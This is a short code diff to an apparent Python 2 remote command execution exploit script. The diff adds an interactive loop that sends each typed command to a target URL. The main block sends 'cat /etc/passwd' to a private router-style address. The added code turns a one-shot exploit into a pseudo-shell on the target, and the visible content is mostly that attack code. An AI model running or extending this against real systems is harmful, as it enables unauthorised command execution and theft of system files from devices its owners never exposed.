@@ -31,7 +31,13 @@ def test_post(url,command):
             print(res.text)
     except Exception as e:
         print("[!]Error:%s"%e)
-          
+ 
+def run_cmd(url,command):
+    test_post(url,command)
+    while(1):
+        cmd = raw_input("#")
+        test_post(url,cmd)
+        
 if __name__ == "__main__":
     test_post("https://192.168.1.1","cat /etc/passwd")
 
